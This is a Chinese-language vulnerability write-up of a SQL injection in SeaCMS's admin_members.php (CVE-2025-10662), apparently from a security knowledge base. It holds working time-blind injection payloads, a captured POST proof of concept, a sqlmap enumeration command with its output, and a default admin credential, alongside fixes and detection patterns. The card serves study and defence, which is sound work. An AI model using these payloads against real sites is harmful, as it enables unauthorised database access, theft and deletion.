---
id: web-generic-sqli-seacms-admin-members-multi-param
title: SeaCMS ≤13.3 admin_members.php 后台多处 SQL 注入：uid/uname/id 直接拼接（CVE-2025-10662）
type: scenario
domain: web
path: web/generic/sqli
technique: seacms-admin-members-unfiltered-parameter-sqli
aliases:
- CVE-2025-10662
- SeaCMS SQL 注入
- 海洋CMS admin_members.php 注入
- ac=editsave SQL 注入
- ac=search uid 注入
- 后台会员管理 SQL 注入
tags:
- php
- seacms
- sqli
- admin-panel
- time-blind
- cve-2025-10662
cve:
- CVE-2025-10662
severity: medium
confidence: high
affected_versions: SeaCMS <= 13.3
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:47:10+08:00'
  notes: 已对照原文核对：CVE-2025-10662、admin_members.php?ac=search uid=1234565) AND (SELECT SLEEP(5))-- - 响应5054ms、sqlmap 时间盲注枚举 information_schema/seacms_db 均与图01/07/09/10一致；版本区间按原文 SeaCMS <= 13.3。原文仅实测 ac=search uid 注入，其余 clear/edit/editsave/del/delall 注入点为源码审计推导未实测；PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

SeaCMS 13.3 及之前版本的 `admin_members.php` 按 `$ac` 分支处理会员搜索/删除/编辑/保存等操作时，把 `$uid`、`$uname`、`$uid1`、`$uname1`、`$id`、`$uidarray` 等参数不加引号/不做类型校验直接拼进 SQL；拥有后台管理员会话的攻击者可通过 `ac=search` 的 `uid` 参数（如 `1234565) AND (SELECT SLEEP(5))-- -`）实施时间盲注，进而用 sqlmap 枚举数据库并窃取敏感信息（CVE-2025-10662）。

## 原理

- **入口与鉴权**：`admin_members.php` 开头 `require_once(.../config.php)` 后调用 `CheckPurview()`，只校验管理员登录态，不校验后续业务参数。`$ac` 来自请求（`ac=search/clear/edit/editsave/del/delall` 等），决定进入哪个分支。
- **搜索分支（漏洞点 1）**：

  ```php
  $wheresql = "where";
  if(!empty($uid))
      $wheresql .= " id in ($uid) and";      // uid 未过滤
  if(!empty($uname)) {
      $uname = str_replace('*', '%', $uname);
      $wheresql .= " username like '$uname'"; // uname 未转义
  }
  $wheresql = rtrim($wheresql, 'and');
  $sql = "select * from sea_member $wheresql";
  $dsql->SetQuery($sql);
  $dsql->Execute('search_list');
  ```

  `$uid` 被放进 `id in (...)` 括号内，可直接用 `)` 闭合括号后追加任意 SQL；`rtrim($wheresql, 'and')` 只做字符级裁剪，不是过滤。`$uname` 被放进单引号 `like`，同样未调用 `addslashes`/`mysqli_real_escape_string`。两条路径均可注入。
- **删除分支（漏洞点 2）**：`ac=clear` 使用 `$uid1`/`$uname1` 构造 `delete from sea_member $wheresql`，同样未过滤，可注入或篡改删除条件。
- **编辑/保存分支（漏洞点 3、4）**：`ac=edit` 直接 `select * from sea_member where id='$id'`；`ac=editsave` 对 `$gid`/`$upoints`/`$ustate` 做了 `intval`，但对 `$id` 未处理，进入 `update sea_member ... where id=$id`（以及 `$delpic==1` 时的 `update ... pic='' where id=$id`）均可注入。
- **单条/批量删除（漏洞点 5、6）**：`ac=del/del2` 执行 `delete from sea_member where id='$id'`；`ac=delall/delall2` 对 `$uidarray` 逐项 `delete from sea_member where id='$id'`，数组元素未过滤。
- **为什么注入成立**：底层 `$dsql->SetQuery()` + `Execute()`/`ExecuteNoneQuery()` 直接执行拼接后的 SQL，没有参数绑定；后台功能默认信任管理员输入，导致“已登录管理员”成为注入前提，但注入后果是数据库层面的任意查询/删除/更新。
- **CVE 背景**：NVD 描述对应 `admin_members.php?ac=editsave` 的 `id` 参数注入，并注明该点不同于 CVE-2025-25513；本文进一步审计出 `search/clear/edit/del/delall` 多处同源问题。

## 触发条件

- 目标为 SeaCMS <= 13.3（原文环境 SeaCMS V13.3 + Apache 2.4.39 + PHP 5.5.9 + MySQL 8.0.11）。
- 攻击者拥有有效的后台管理员会话（登录后台，原文默认 admin/admin123），或能通过其他方式携带管理员 Cookie。
- 后台目录名可被枚举/已知（原文安装生成随机后台路径 `9vlmn4`）。
- 目标未部署针对 `admin_members.php` 参数的 WAF/过滤。
- MySQL 支持 `SLEEP()`/子查询（时间盲注）；错误回显与否不影响布尔/时间盲注。

## 利用步骤

1. 登录后台获取管理员 Cookie（如 `PHPSESSID`），确认后台路径与 `admin_members.php` 可访问。
2. 进入“会员搜索”页面，输入任意用户名/UID 并抓包，确认请求形如 `POST /<admin>/admin_members.php?ac=search`，参数 `uname`、`uid`。
3. 在 `uid` 值中闭合 `id in (`：`1234565) AND (SELECT SLEEP(5))-- -`，其余参数保留合法值以通过 `empty()` 判断。
4. 观察响应时间稳定增加约 5 秒，确认时间盲注；用 `SLEEP(0)`/不同延时做对照，排除网络抖动。
5. 将请求保存为 `post.txt`，用 sqlmap 指定该请求：`python sqlmap.py -r post.txt --dbs --batch`，获取数据库列表、表与字段。
6. 按需扩展到 `ac=edit`/`editsave`/`del` 等分支（`id`/`uid1`/`uname1`），验证其他注入点并提取数据。

## PoC

后台搜索请求（Burp 抓包，节选）：

```http
POST /9vlmn4/admin_members.php?ac=search HTTP/1.1
Host: test-seacms.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<admin-session>; XLA_CI=<...>

uname=admin&uid=1234565) AND (SELECT SLEEP(5))-- -
```

响应耗时约 5054 ms（原文截图），确认注入。sqlmap 识别结果：

```text
Parameter: #2* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin&uid=1234565) AND (SELECT 1117 FROM (SELECT(SLEEP(5)))fmLh) AND (9160=9160)
```

后续枚举出 `information_schema`、`seacms_db` 等数据库。

其他分支示例（按源码拼接方式构造）：

```text
ac=clear   -> uid1=1) AND (SELECT SLEEP(5))-- -
ac=edit    -> id=1' AND (SELECT SLEEP(5))-- -
ac=editsave-> id=1 AND (SELECT SLEEP(5))-- -
ac=del     -> id=1' AND (SELECT SLEEP(5))-- -
```

## 变体与关联

- **注入点差异**：`ac=search` 的 `uid` 是括号内数值型注入，`uname` 是单引号 LIKE 注入；`ac=edit`/`editsave`/`del` 的 `id` 是单引号包裹的注入；`ac=delall` 的数组元素逐个拼接，适合批量注入/删除。
- **同源 CVE**：原文提到 CVE-2025-10662 与 CVE-2025-25513 是不同注入点，说明同一文件存在多次修复遗漏；审计时应覆盖所有 `$ac` 分支。
- **后台路径随机化不是安全边界**：安装生成随机后台目录只增加枚举成本，登录后即可利用。
- **关联卡片**：[[web-generic-sqli-like-clause-append-search]]（LIKE 搜索拼接注入）、[[web-generic-sqli-login-password-unquoted-or-bypass]]（后台登录注入）、[[web-generic-sqli-php-array-filter-walk-recursive-unfiltered]]（PHP 数组参数未过滤）。

## 检测与防御

- **修复**：对所有 ID 类参数使用 `intval()` 或强类型转换；`uname` 等字符串参数使用预处理语句/参数绑定（PDO/MySQLi），不要拼接；删除/更新语句同样必须参数化。
- **最小权限**：后台数据库账户仅授予业务所需权限，禁止 `FILE`、跨库读取；敏感表加密/脱敏。
- **后台加固**：管理员强密码、MFA、后台 IP 白名单、随机会话与 CSRF token；不要在默认 admin/admin123 下运行。
- **检测**：WAF/日志关注 `admin_members.php` 中 `uid`/`uname`/`id` 含 `)`, `'`, `SLEEP(`, `AND (SELECT`, `-- -` 的请求；监控后台请求响应时间异常（固定 5 秒/10 秒）；审计数据库慢查询中出现 `SLEEP`/`BENCHMARK`。
- **排查**：检查 `sea_member` 等表是否被异常查询/批量删除；对照官方补丁核对 `admin_members.php` 所有 `$ac` 分支的拼接点。
